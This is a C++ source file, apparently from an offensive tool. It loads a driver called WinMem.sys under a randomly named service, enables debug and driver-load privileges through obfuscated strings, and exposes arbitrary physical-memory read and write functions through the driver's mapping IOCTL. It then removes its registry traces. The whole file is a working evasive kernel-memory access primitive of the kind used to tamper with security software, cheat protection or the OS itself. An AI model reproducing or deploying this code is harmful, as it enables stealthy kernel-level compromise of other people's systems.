#include "driver.h"

#include <winternl.h>
#include <cstdio>
#include <cwchar>
#include <cstring>
#include "../core/hash_string.h"

namespace nx
{

    namespace
    {
        HANDLE g_drv = INVALID_HANDLE_VALUE;

        const char* svc_name() noexcept
        {
            static char buf[16] = {};
            if (buf[0]) return buf;
            FILETIME ft = {};
            GetSystemTimeAsFileTime(&ft);
            DWORD seed = ft.dwLowDateTime ^ (ft.dwHighDateTime << 7) ^ GetCurrentProcessId();
            static const char kAlpha[] =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            for (int i = 0; i < 12; i++) {
                seed ^= seed << 13; seed ^= seed >> 17; seed ^= seed << 5;
                buf[i] = kAlpha[static_cast<unsigned>(seed) % (sizeof(kAlpha) - 1)];
            }
            return buf;
        }
    }

    using NtDrvFn_t = NTSTATUS(NTAPI*)(PUNICODE_STRING);

    static NtDrvFn_t ntld() noexcept {
        static auto fn = reinterpret_cast<NtDrvFn_t>(
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver"));
        return fn;
    }
    static NtDrvFn_t ntud() noexcept {
        static auto fn = reinterpret_cast<NtDrvFn_t>(
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnloadDriver"));
        return fn;
    }

    static wchar_t g_reg_path[256] = {};
    static char    g_reg_key[256]  = {};

    static UNICODE_STRING make_us(wchar_t* s) noexcept {
        UNICODE_STRING us;
        us.Buffer        = s;
        us.Length        = static_cast<USHORT>(wcslen(s) * sizeof(wchar_t));
        us.MaximumLength = us.Length + sizeof(wchar_t);
        return us;
    }

    bool load_driver()
    {

        char full_path[MAX_PATH] = {};
        const char* candidates[] = { ".\\WinMem.sys", "WinMem.sys" };
        for (auto p : candidates) {
            if (GetFileAttributesA(p) != INVALID_FILE_ATTRIBUTES) {
                GetFullPathNameA(p, MAX_PATH, full_path, nullptr);
                break;
            }
        }
        if (!full_path[0]) return false;

        char nt_image[MAX_PATH + 4];
        snprintf(nt_image, sizeof nt_image, "\\??\\%s", full_path);

        const char* name = svc_name();
        snprintf(g_reg_key, sizeof g_reg_key,
                 "SYSTEM\\CurrentControlSet\\Services\\%s", name);

        HKEY hk = nullptr;
        DWORD disp = 0;
        if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, g_reg_key, 0, nullptr,
                            0, KEY_SET_VALUE, nullptr, &hk, &disp) != ERROR_SUCCESS)
            return false;

        DWORD type_kd = 1, start_demand = 3, err_normal = 1;
        bool wrote =
            RegSetValueExA(hk, "ImagePath", 0, REG_EXPAND_SZ,
                           reinterpret_cast<BYTE*>(nt_image),
                           static_cast<DWORD>(strlen(nt_image) + 1)) == ERROR_SUCCESS &&
            RegSetValueExA(hk, "Type",        0, REG_DWORD,
                           reinterpret_cast<BYTE*>(&type_kd),     sizeof type_kd)     == ERROR_SUCCESS &&
            RegSetValueExA(hk, "Start",       0, REG_DWORD,
                           reinterpret_cast<BYTE*>(&start_demand), sizeof start_demand) == ERROR_SUCCESS &&
            RegSetValueExA(hk, "ErrorControl",0, REG_DWORD,
                           reinterpret_cast<BYTE*>(&err_normal),  sizeof err_normal)  == ERROR_SUCCESS;
        RegCloseKey(hk);

        if (!wrote) {
            RegDeleteKeyExA(HKEY_LOCAL_MACHINE, g_reg_key, KEY_WOW64_64KEY, 0);
            return false;
        }

        wchar_t wname[64] = {};
        for (int i = 0; name[i] && i < 63; i++) wname[i] = static_cast<wchar_t>(name[i]);
        swprintf(g_reg_path, 256,
                 L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\%ls",
                 wname);

        auto fn = ntld();
        if (!fn) {
            RegDeleteKeyExA(HKEY_LOCAL_MACHINE, g_reg_key, KEY_WOW64_64KEY, 0);
            return false;
        }

        UNICODE_STRING us = make_us(g_reg_path);
        NTSTATUS st = fn(&us);
        if (!NT_SUCCESS(st)) {
            RegDeleteKeyExA(HKEY_LOCAL_MACHINE, g_reg_key, KEY_WOW64_64KEY, 0);
            g_reg_path[0] = g_reg_key[0] = 0;
            return false;
        }

        return true;
    }

    bool open_driver()
    {
        g_drv = CreateFileW(LR"(\\.\WinMem)", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                            OPEN_EXISTING, 0, nullptr);
        return g_drv != INVALID_HANDLE_VALUE;
    }

    void close_driver()
    {
        if (g_drv != INVALID_HANDLE_VALUE) {
            CloseHandle(g_drv);
            g_drv = INVALID_HANDLE_VALUE;
        }

        if (g_reg_path[0]) {

            auto fn = ntud();
            if (fn) {
                UNICODE_STRING us = make_us(g_reg_path);
                fn(&us);
            }
            RegDeleteKeyExA(HKEY_LOCAL_MACHINE, g_reg_key, KEY_WOW64_64KEY, 0);
            g_reg_path[0] = g_reg_key[0] = 0;
        }
    }

    HANDLE driver_handle()
    {
        return g_drv;
    }

    bool pr8(std::uint64_t pa, std::uint64_t *v)
    {
        if (!v || g_drv == INVALID_HANDLE_VALUE)
        {
            return false;
        }

        MapReq r = {};
        r.pa.QuadPart = static_cast<LONGLONG>(pa & ~0xFFFULL);
        r.s0.QuadPart = 0x1000;
        DWORD b = 0;

        if (!DeviceIoControl(g_drv, IOCTL_MAP, &r, sizeof r, &r, sizeof r, &b,
                             nullptr) ||
            !r.va)
        {
            return false;
        }

        *v = *reinterpret_cast<volatile std::uint64_t *>(
            reinterpret_cast<std::uint8_t *>(r.va) + (pa & 0xFFF));
        return true;
    }

    bool pw8(std::uint64_t pa, std::uint64_t v)
    {
        if (g_drv == INVALID_HANDLE_VALUE)
        {
            return false;
        }

        MapReq r = {};
        r.pa.QuadPart = static_cast<LONGLONG>(pa & ~0xFFFULL);
        r.s0.QuadPart = 0x1000;
        DWORD b = 0;

        if (!DeviceIoControl(g_drv, IOCTL_MAP, &r, sizeof r, &r, sizeof r, &b,
                             nullptr) ||
            !r.va)
        {
            return false;
        }

        *reinterpret_cast<volatile std::uint64_t *>(
            reinterpret_cast<std::uint8_t *>(r.va) + (pa & 0xFFF)) = v;
        return true;
    }

    bool prn(std::uint64_t pa, void *buf, std::uint32_t len)
    {
        if (!buf || len == 0 || g_drv == INVALID_HANDLE_VALUE)
        {
            return false;
        }

        std::uint32_t read = 0;
        std::uint32_t offset = 0;

        while (read < len)
        {
            std::uint32_t to_read = (len - read > 0x1000) ? 0x1000 : (len - read);
            std::uint64_t aligned_pa = pa + offset;

            MapReq r = {};
            r.pa.QuadPart = static_cast<LONGLONG>(aligned_pa & ~0xFFF);
            r.s0.QuadPart = 0x1000;
            DWORD b = 0;

            if (!DeviceIoControl(g_drv, IOCTL_MAP, &r, sizeof r, &r, sizeof r, &b,
                                 nullptr) ||
                !r.va)
            {
                return false;
            }

            std::uint32_t page_offset = aligned_pa & 0xFFF;
            std::uint32_t copy_len = (page_offset + to_read > 0x1000) ? (0x1000 - page_offset) : to_read;

            std::memcpy(reinterpret_cast<char *>(buf) + offset,
                        reinterpret_cast<char *>(r.va) + page_offset,
                        copy_len);

            read += copy_len;
            offset += copy_len;
        }

        return true;
    }

    bool pwn(std::uint64_t pa, const void *buf, std::uint32_t len)
    {
        if (!buf || len == 0 || g_drv == INVALID_HANDLE_VALUE)
        {
            return false;
        }

        std::uint32_t written = 0;
        std::uint32_t offset  = 0;

        while (written < len)
        {
            std::uint32_t to_write = (len - written > 0x1000) ? 0x1000 : (len - written);
            std::uint64_t aligned_pa = pa + offset;

            MapReq r = {};
            r.pa.QuadPart = static_cast<LONGLONG>(aligned_pa & ~0xFFF);
            r.s0.QuadPart = 0x1000;
            DWORD b = 0;

            if (!DeviceIoControl(g_drv, IOCTL_MAP, &r, sizeof r, &r, sizeof r, &b,
                                 nullptr) ||
                !r.va)
            {
                return false;
            }

            std::uint32_t page_offset = aligned_pa & 0xFFF;
            std::uint32_t copy_len = (page_offset + to_write > 0x1000) ? (0x1000 - page_offset) : to_write;

            std::memcpy(reinterpret_cast<char *>(r.va) + page_offset,
                        reinterpret_cast<const char *>(buf) + offset,
                        copy_len);

            written += copy_len;
            offset  += copy_len;
        }

        return true;
    }

    void enable_priv()
    {
        HANDLE t = nullptr;
        if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t))
            return;

        auto grant = [&](const char* name) {
            LUID l = {};
            if (!LookupPrivilegeValueA(nullptr, name, &l)) return;
            TOKEN_PRIVILEGES tp = {};
            tp.PrivilegeCount   = 1;
            tp.Privileges[0]    = { l, SE_PRIVILEGE_ENABLED };
            AdjustTokenPrivileges(t, FALSE, &tp, sizeof tp, nullptr, nullptr);
        };

        grant(AY_OBFUSCATE("SeDebugPrivilege"));
        grant(AY_OBFUSCATE("SeLoadDriverPrivilege"));

        CloseHandle(t);
    }

}
